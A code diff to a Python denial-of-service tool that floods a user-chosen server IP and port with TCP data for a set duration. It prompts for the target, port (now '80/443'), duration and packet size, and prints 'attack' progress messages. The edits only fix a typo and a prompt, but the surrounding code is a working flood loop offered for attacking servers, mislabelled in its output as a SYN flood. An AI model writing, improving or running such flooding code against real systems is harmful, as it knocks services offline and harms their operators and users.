@@ -143,7 +143,7 @@ def tcp_data_flood_multi(ip, port, duration, packet_size):
             sock.connect((ip, port))
             while time.time() < end_time:
                 time.sleep(0.2)
-                print("\033[48;5;0mStarting TCP SYN flood Multi-hreads \033[0m \033[91m" +str(ip)+ " \033[33m0k..!")
+                print("\033[48;5;0mStarting TCP SYN flood Multi-threads \033[0m \033[91m" +str(ip)+ " \033[33m0k..!")
                 print("\033[33m Starting TCP SYN flood Multi-threads \033[32m" +str(packet_count)+ " \033[97mnumb-attack") 
                 sock.send(payload)
                 packet_count[0] += 1
@@ -205,7 +205,7 @@ def main():
         method = input(Fore.LIGHTBLUE_EX + "Select method (1-2): ").strip()
 
         ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
-        port = validate_input("Enter port (80): ", 1, 65535)
+        port = validate_input("Enter port (80/443): ", 1, 65535)
         duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
         packet_size = validate_input("Enter packet size in bytes (1-65500): ", 1, 65500)
 
@@ -223,7 +223,7 @@ def main():
         method = input(Fore.LIGHTBLUE_EX + "Select method (1-2): ").strip()
 
         ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
-        port = validate_input("Enter port (80): ", 1, 65535)
+        port = validate_input("Enter port (80/443): ", 1, 65535)
         duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
 
         print(Fore.LIGHTBLUE_EX + "Execution Style:")
